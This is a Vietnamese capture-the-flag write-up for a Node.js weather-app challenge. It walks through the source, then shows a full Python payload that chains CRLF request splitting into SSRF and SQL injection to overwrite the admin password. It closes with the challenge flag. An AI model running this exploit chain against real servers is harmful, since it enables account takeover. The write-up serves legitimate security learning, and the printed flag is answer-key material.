## 1. Source code:

Đầu tiên thấy trong file `index.js` có route `/login` với method `post`:
```js
router.post('/login', (req, res) => {
	let { username, password } = req.body;

	if (username && password) {
		return db.isAdmin(username, password)
			.then(admin => {
				if (admin) return res.send(fs.readFileSync('/app/flag').toString());
				return res.send(response('You are not admin'));
			})
			.catch(() => res.send(response('Something went wrong')));
	}
	
	return re.send(response('Missing parameters'));
});
```
-> Login vào tài khoản `admin` thì sẽ nhận được flag từ thư mục `/app/flag`.

Vậy tài khoản `admin` được tạo như thế nào, xem trong file `database.js` có hàm `migrate`:
```js
async migrate() {
    return this.db.exec(`
        DROP TABLE IF EXISTS users;

        CREATE TABLE IF NOT EXISTS users (
            id         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
            username   VARCHAR(255) NOT NULL UNIQUE,
            password   VARCHAR(255) NOT NULL
        );

        INSERT INTO users (username, password) VALUES ('admin', '${ crypto.randomBytes(32).toString('hex') }');
    `);
}
```
Như vậy username sẽ là `admin`, tuy nhiên `password` lại được tạo từ chuỗi random -> không brute-force được!

Ngoài ra ta thấy có hàm `isAdmin`:
```js
async isAdmin(user, pass) {
    return new Promise(async (resolve, reject) => {
        try {
            let smt = await this.db.prepare('SELECT username FROM users WHERE username = ? and password = ?');
            let row = await smt.get(user, pass);
            resolve(row !== undefined ? row.username == 'admin' : false);
        } catch(e) {
            reject(e);
        }
    });
}
```

Hàm trên sử dụng parameterized query nên không thể sử dụng SQLi được!

Nhưng với hàm `register` thì câu query nối chuỗi -> có thể sử dụng SQLi ở đây (._.")

```js
async register(user, pass) {
    // TODO: add parameterization and roll public
    return new Promise(async (resolve, reject) => {
        try {
            let query = `INSERT INTO users (username, password) VALUES ('${user}', '${pass}')`;
            resolve((await this.db.run(query)));
        } catch(e) {
            reject(e);
        }
    });
}
```

Quay lại hàm `migrate` trong file `database.js` để xem cấu trúc database:
```js
async migrate() {
    return this.db.exec(`
        DROP TABLE IF EXISTS users;

        CREATE TABLE IF NOT EXISTS users (
            id         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
            username   VARCHAR(255) NOT NULL UNIQUE,
            password   VARCHAR(255) NOT NULL
        );

        INSERT INTO users (username, password) VALUES ('admin', '${ crypto.randomBytes(32).toString('hex') }');
    `);
}
```
Ta thấy giá trị `username` là UNIQUE, nên không thể tạo thêm một tài khoản `admin` khác được. Như vậy ta sẽ phải cập nhật `password` của tài khoản admin hiện tại. Trong SQL có lệnh `INSERT ON CONFLICT` có thể giải quyết case này.

Tuy nhiên khi truy cập vào route `/register` thì báo lỗi `401`:
```
This page isn’t working
If the problem continues, contact the site owner.
HTTP ERROR 401
```

Quay lại xem route `/register` trong file `index.js`:
```js
router.post('/register', (req, res) => {

	if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
		return res.status(401).end();
	}

	let { username, password } = req.body;

	if (username && password) {
		return db.register(username, password)
			.then(()  => res.send(response('Successfully registered')))
			.catch(() => res.send(response('Something went wrong')));
	}

	return res.send(response('Missing parameters'));
});
```

Như vậy là ứng dụng chỉ cho phép thực hiện register từ ip `127.0.0.1` (localhost), khả năng cao sẽ liên quan đến lỗi SSRF.

Ngoài ra ta xem thêm ở hàm `getWeather` ở file `helpers/WeatherHelper.js`:
```js
module.exports = {
    async getWeather(res, endpoint, city, country) {
    ...
```
Hàm này nhận các tham số endpoint, city, country từ file `static/js/main.js` với giá trị như sau:
```js
const getWeather = async () => {

    let endpoint = 'api.openweathermap.org';

    let res  = await fetch('//ip-api.com/json/')
        .catch(() => {
            weather.innerHTML = `
                <img src='/static/host-unreachable.jpg'>
                <br><br>
                <h4>👨‍🔧 Disable blocker addons</h2>
            `;
        });

    let data = await res.json();

    let { countryCode, city } = data;

    ...
```

Biến data ở đây không được validate, như vậy có thể thực hiện injection vào data bằng cách lợi dụng việc trang web get api lấy thông tin thời tiết.

Ở file `package.json` ta có thể thấy được các biến config cũng như vesion của NodeJS là `"nodeVersion": "v8.12.0"`. 

Sau khi research, version này tồn tại lỗ hổng `Http request splitting`, tức là chúng ta có thể  gửi data đi kèm với HTTP header đến ip `127.0.0.1` để thực hiện update password admin, thông qua kỹ thuật CRLF injection.

Payload:
```python
import requests

url = "http://139.59.172.163:31345/api/weather"

username = "admin"
new_password = "123456"
password = f"{new_password}') ON CONFLICT(username) DO UPDATE SET password = '{new_password}';"

username_encoded = username.replace(" ", "\u0120").replace("'", "%27").replace('"',"%22") # %27='
password_encoded = password.replace(" ", "\u0120").replace("'", "%27").replace('"',"%22") # %22="

contentLength = len(username_encoded) + len(password_encoded) + 20

# \u010D = \r, \u010A = \n, \u0120 = space
test = "localhost/abc\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010A"
test = test + "Content-Length:\u0120" + str(contentLength) + "\u010D\u010A\u010D\u010A"
test = test + f"username={username_encoded}&password={password_encoded}" + "\u010D\u010A\u010D\u010AGET\u0120/?q="
 
r = requests.post(url = url, json={'endpoint': test, 'city': 'Ha Noi','country': 'VN'})
```

Login as `username=admin&password=123456`:

Flag: `HTB{w3lc0m3_t0_th3_p1p3_dr34m}`